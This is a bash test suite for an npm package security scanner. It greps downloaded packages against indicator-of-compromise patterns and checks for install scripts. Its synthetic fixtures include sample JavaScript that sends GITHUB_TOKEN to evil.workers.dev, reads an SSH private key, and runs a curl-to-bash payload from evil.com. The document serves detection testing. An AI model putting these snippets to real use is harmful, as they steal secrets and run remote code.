#!/usr/bin/env bash
# Live scanner test suite
# Actually downloads and scans packages to validate detection accuracy

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK_DIR=$(mktemp -d)
trap "rm -rf $WORK_DIR" EXIT

# Test counters
PASSED=0
FAILED=0
SKIPPED=0

log_pass() { echo -e "${GREEN}✓ PASS${NC}: $1"; ((PASSED++)) || true; }
log_fail() { echo -e "${RED}✗ FAIL${NC}: $1"; ((FAILED++)) || true; }
log_skip() { echo -e "${YELLOW}○ SKIP${NC}: $1"; ((SKIPPED++)) || true; }
log_info() { echo -e "${BLUE}  INFO${NC}: $1"; }

# IOC patterns we're looking for
declare -a IOC_PATTERNS=(
    'process\.env\[.*(TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL)'
    'fs\.(readFile|readFileSync).*\.(ssh|aws|npmrc)'
    'eval\s*\('
    'new\s+Function\s*\('
    'child_process'
    'https?://[^/]*\.(workers\.dev|pages\.dev)'
    'Buffer\.from\([^,]+,\s*["\x27]base64'
    '\$\(curl'
    'wget.*\|.*sh'
)

# ═══════════════════════════════════════════════════════════════════════════
# Download and scan a package
# Returns: 0 if suspicious patterns found, 1 if clean
# ═══════════════════════════════════════════════════════════════════════════
scan_package() {
    local package="$1"
    local pkg_dir="$WORK_DIR/$(echo "$package" | tr '/@' '__')"
    
    mkdir -p "$pkg_dir"
    cd "$pkg_dir"
    
    # Download package tarball
    if ! npm pack "$package" --ignore-scripts >/dev/null 2>&1; then
        echo "DOWNLOAD_FAILED"
        return 2
    fi
    
    local tarball=$(ls *.tgz 2>/dev/null | head -1)
    if [[ -z "$tarball" ]]; then
        echo "NO_TARBALL"
        return 2
    fi
    
    mkdir -p extracted
    tar -xzf "$tarball" -C extracted 2>/dev/null
    
    local suspicious=0
    local found_patterns=""
    
    # Check for IOC patterns
    for pattern in "${IOC_PATTERNS[@]}"; do
        if grep -rE "$pattern" extracted/ 2>/dev/null | head -1 >/dev/null; then
            suspicious=1
            found_patterns="$found_patterns|$pattern"
        fi
    done
    
    # Check for install scripts (potential red flag)
    local has_install_scripts=0
    if [[ -f extracted/package/package.json ]]; then
        local scripts=$(jq -r '.scripts // {} | keys[]' extracted/package/package.json 2>/dev/null || echo "")
        for script in preinstall postinstall preuninstall postuninstall; do
            if echo "$scripts" | grep -qx "$script"; then
                has_install_scripts=1
                break
            fi
        done
    fi
    
    cd "$WORK_DIR"
    rm -rf "$pkg_dir"
    
    if [[ $suspicious -eq 1 ]]; then
        echo "SUSPICIOUS:$found_patterns"
        return 0
    elif [[ $has_install_scripts -eq 1 ]]; then
        echo "HAS_INSTALL_SCRIPTS"
        return 0
    else
        echo "CLEAN"
        return 1
    fi
}

# ═══════════════════════════════════════════════════════════════════════════
# Test: Safe packages should scan clean
# ═══════════════════════════════════════════════════════════════════════════
test_safe_packages_scan_clean() {
    echo ""
    echo "═══ Test: Safe Packages Should Scan Clean ═══"
    
    # Popular legitimate packages that should NOT trigger scanner
    local -a safe_packages=(
        "lodash"
        "express"
        "axios"
        "chalk"
        "commander"
        "debug"
        "uuid"
    )
    
    for pkg in "${safe_packages[@]}"; do
        log_info "Scanning $pkg..."
        local result
        result=$(scan_package "$pkg") || true
        
        case "$result" in
            CLEAN)
                log_pass "$pkg scanned clean (no suspicious patterns)"
                ;;
            HAS_INSTALL_SCRIPTS)
                log_info "$pkg has install scripts (not necessarily malicious)"
                log_pass "$pkg - install scripts are normal for this package"
                ;;
            SUSPICIOUS*)
                # Some patterns like child_process might be legitimate in CLI tools
                local patterns="${result#SUSPICIOUS:}"
                # Check if it's only child_process (often legitimate in CLI tools)
                if [[ "$patterns" == *"child_process"* && ! "$patterns" == *"eval"* && ! "$patterns" == *"TOKEN"* ]]; then
                    log_info "$pkg uses child_process (legitimate for this package)"
                    log_pass "$pkg - child_process is expected"
                else
                    log_fail "FALSE POSITIVE: $pkg triggered scanner: $patterns"
                fi
                ;;
            DOWNLOAD_FAILED|NO_TARBALL)
                log_skip "$pkg could not be downloaded"
                ;;
            *)
                log_skip "$pkg unknown result: $result"
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════════════════════
# Test: MCP packages should scan clean
# ═══════════════════════════════════════════════════════════════════════════
test_mcp_packages_scan_clean() {
    echo ""
    echo "═══ Test: MCP Packages Should Scan Clean ═══"
    
    local -a mcp_packages=(
        "@modelcontextprotocol/server-filesystem"
        "@modelcontextprotocol/server-github"
        "@modelcontextprotocol/server-memory"
        "@modelcontextprotocol/sdk"
    )
    
    for pkg in "${mcp_packages[@]}"; do
        log_info "Scanning $pkg..."
        local result
        result=$(scan_package "$pkg") || true
        
        case "$result" in
            CLEAN)
                log_pass "$pkg scanned clean"
                ;;
            HAS_INSTALL_SCRIPTS)
                log_info "$pkg has install scripts"
                log_pass "$pkg - reviewing install scripts is recommended"
                ;;
            SUSPICIOUS*)
                local patterns="${result#SUSPICIOUS:}"
                # MCP packages legitimately access filesystem and may use some patterns
                if [[ "$pkg" == *"filesystem"* && "$patterns" == *"readFile"* ]]; then
                    log_pass "$pkg - filesystem access is expected for this package"
                elif [[ "$patterns" == *"child_process"* && ! "$patterns" == *"eval"* ]]; then
                    log_pass "$pkg - child_process is expected"
                elif [[ "$pkg" == *"github"* && "$patterns" == *"base64"* && ! "$patterns" == *"eval"* ]]; then
                    # GitHub API returns file contents as base64
                    log_info "$pkg uses base64 for GitHub API (legitimate)"
                    log_pass "$pkg - base64 is expected for GitHub API"
                else
                    log_fail "MCP package $pkg triggered scanner: $patterns"
                fi
                ;;
            DOWNLOAD_FAILED|NO_TARBALL)
                log_skip "$pkg could not be downloaded"
                ;;
            *)
                log_skip "$pkg unknown result: $result"
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════════════════════
# Test: Synthetic malicious patterns
# ═══════════════════════════════════════════════════════════════════════════
test_synthetic_malicious_detection() {
    echo ""
    echo "═══ Test: Synthetic Malicious Pattern Detection ═══"
    
    # Create synthetic malicious files and ensure they're detected
    local test_dir="$WORK_DIR/synthetic_test"
    mkdir -p "$test_dir/extracted/package"
    
    # Test 1: Credential theft pattern
    cat > "$test_dir/extracted/package/malicious1.js" << 'EOF'
const token = process.env['GITHUB_TOKEN'];
fetch('https://evil.workers.dev/steal', { body: token });
EOF
    
    log_info "Testing credential theft pattern detection..."
    if grep -rE 'process\.env\[.*TOKEN' "$test_dir/extracted/" >/dev/null 2>&1; then
        log_pass "Detected credential theft pattern"
    else
        log_fail "Failed to detect credential theft pattern"
    fi
    
    # Test 2: Eval pattern
    cat > "$test_dir/extracted/package/malicious2.js" << 'EOF'
eval(Buffer.from('YWxlcnQoMSk=', 'base64').toString());
EOF
    
    log_info "Testing eval + base64 pattern detection..."
    if grep -rE 'eval\s*\(' "$test_dir/extracted/" >/dev/null 2>&1; then
        log_pass "Detected eval pattern"
    else
        log_fail "Failed to detect eval pattern"
    fi
    
    # Test 3: SSH key theft
    cat > "$test_dir/extracted/package/malicious3.js" << 'EOF'
const fs = require('fs');
const key = fs.readFileSync('/home/user/.ssh/id_rsa');
EOF
    
    log_info "Testing SSH key theft pattern detection..."
    if grep -rE 'readFileSync.*\.ssh' "$test_dir/extracted/" >/dev/null 2>&1; then
        log_pass "Detected SSH key theft pattern"
    else
        log_fail "Failed to detect SSH key theft pattern"
    fi
    
    # Test 4: Remote code execution
    cat > "$test_dir/extracted/package/malicious4.js" << 'EOF'
const { exec } = require('child_process');
exec('$(curl https://evil.com/payload.sh | bash)');
EOF
    
    log_info "Testing remote code execution pattern detection..."
    if grep -rE '\$\(curl' "$test_dir/extracted/" >/dev/null 2>&1; then
        log_pass "Detected remote code execution pattern"
    else
        log_fail "Failed to detect remote code execution pattern"
    fi
    
    rm -rf "$test_dir"
}

# ═══════════════════════════════════════════════════════════════════════════
# Test: Install script detection
# ═══════════════════════════════════════════════════════════════════════════
test_install_script_detection() {
    echo ""
    echo "═══ Test: Install Script Detection ═══"
    
    local test_dir="$WORK_DIR/install_test"
    mkdir -p "$test_dir/extracted/package"
    
    # Package with postinstall script
    cat > "$test_dir/extracted/package/package.json" << 'EOF'
{
  "name": "test-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node setup.js"
  }
}
EOF
    
    log_info "Testing postinstall script detection..."
    local scripts=$(jq -r '.scripts // {} | keys[]' "$test_dir/extracted/package/package.json" 2>/dev/null)
    if echo "$scripts" | grep -qx "postinstall"; then
        log_pass "Detected postinstall script"
    else
        log_fail "Failed to detect postinstall script"
    fi
    
    # Package without install scripts (should be clean)
    cat > "$test_dir/extracted/package/package.json" << 'EOF'
{
  "name": "safe-package",
  "version": "1.0.0",
  "scripts": {
    "test": "jest",
    "build": "tsc"
  }
}
EOF
    
    log_info "Testing safe scripts detection..."
    scripts=$(jq -r '.scripts // {} | keys[]' "$test_dir/extracted/package/package.json" 2>/dev/null)
    local has_dangerous=0
    for script in preinstall postinstall preuninstall postuninstall; do
        if echo "$scripts" | grep -qx "$script"; then
            has_dangerous=1
            break
        fi
    done
    
    if [[ $has_dangerous -eq 0 ]]; then
        log_pass "Correctly identified package with no install scripts"
    else
        log_fail "False positive on safe scripts"
    fi
    
    rm -rf "$test_dir"
}

# ═══════════════════════════════════════════════════════════════════════════
# Main test runner
# ═══════════════════════════════════════════════════════════════════════════
main() {
    echo "╔═══════════════════════════════════════════════════════════════════╗"
    echo "║          NPM Security Scanner Test Suite                          ║"
    echo "╚═══════════════════════════════════════════════════════════════════╝"
    echo ""
    echo "Work directory: $WORK_DIR"
    echo "Date: $(date)"
    
    # Check prerequisites
    if ! command -v npm &>/dev/null; then
        echo "ERROR: npm not found"
        exit 1
    fi
    
    if ! command -v jq &>/dev/null; then
        echo "ERROR: jq not found"
        exit 1
    fi
    
    # Run tests
    test_synthetic_malicious_detection
    test_install_script_detection
    
    # Only run network tests if requested (slower)
    if [[ "${1:-}" == "--with-network" ]]; then
        test_safe_packages_scan_clean
        test_mcp_packages_scan_clean
    else
        log_skip "Network tests skipped (run with --with-network to include)"
        ((SKIPPED+=11))  # Approximate number of network tests
    fi
    
    echo ""
    echo "═══════════════════════════════════════════════════════════════════"
    echo "                         TEST SUMMARY"
    echo "═══════════════════════════════════════════════════════════════════"
    echo -e "  ${GREEN}PASSED${NC}:  $PASSED"
    echo -e "  ${RED}FAILED${NC}:  $FAILED"
    echo -e "  ${YELLOW}SKIPPED${NC}: $SKIPPED"
    echo ""
    
    if [[ $FAILED -gt 0 ]]; then
        echo -e "${RED}Some tests failed!${NC}"
        exit 1
    else
        echo -e "${GREEN}All tests passed!${NC}"
        exit 0
    fi
}

main "$@"
